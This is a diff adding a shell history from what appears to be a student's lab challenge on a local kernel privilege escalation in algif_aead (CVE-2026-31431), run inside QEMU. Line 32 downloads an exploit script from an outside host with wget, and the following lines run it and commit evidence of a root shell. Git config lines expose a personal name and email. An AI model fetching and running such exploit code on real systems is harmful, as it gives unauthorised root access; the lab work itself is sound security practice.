@@ -1,0 +1,41 @@
+apt update
+    2  apt install gh
+    3  gh api user --jq '"\(.name)�me) → \(.email // .login)"'
+    4  git config --global user.name "David1011-T"
+    5  git config --global user.email "datorresve@uide.edu.ec"
+    6  git config --global --add safe.directory /workspaces/copy-fail-challenge-1
+    7  make setup
+    8  make qemu
+    9  apt update
+   10  apt install -y file
+   11  make rootfs
+   12  make qemu
+   13  apt update
+   14  apt upgrade
+   15  apt install gh
+   16  gh api user --jq '"\(.name) → \(.email // .login)"'}
+   17  gh api user --jq '"\(.name) → \(.email // .login)"'
+   18  git config --global user.name "David1011-T"
+   19  git config --global user.email "datorresve@uide.edu.ec"
+   20  git config --global --add safe.directory /workspaces/copy-fail-challenge-1
+   21  make rootfs
+   22  make qemu
+   23  make setup
+   24  make qemu
+   25  make clean
+   26  make setup
+   27  make qemu
+   28  git add evidence/hito1_vuln_confirmed.txt
+   29  git commit -m "hito-1: kernel vulnerable confirmado - $(date +%Y-%m-%dT%H:%M)"
+   30  git tag -a hito-1 -m "Kernel vulnerable corriendo, algif_aead confirmado"
+   31  git push origin main --tags
+   32  wget https://copy.fail/exp -O copy_fail_exp.py
+   33  vi copy_fail_exp.py
+   34  id
+   35  python3 copy_fail_exp.py
+   36  git add evidence/hito2_root_shell.txt
+   37  git commit -m "hito-2: exploit exitoso, root obtenido - $(date +%Y-%m-%dT%H:%M)"
+   38  git tag -a hito-2 -m "CVE-2026-31431 explotado exitosamente"
+   39  git push origin main --tags
+   40  lsmod | grep algif_aead
+   41  history
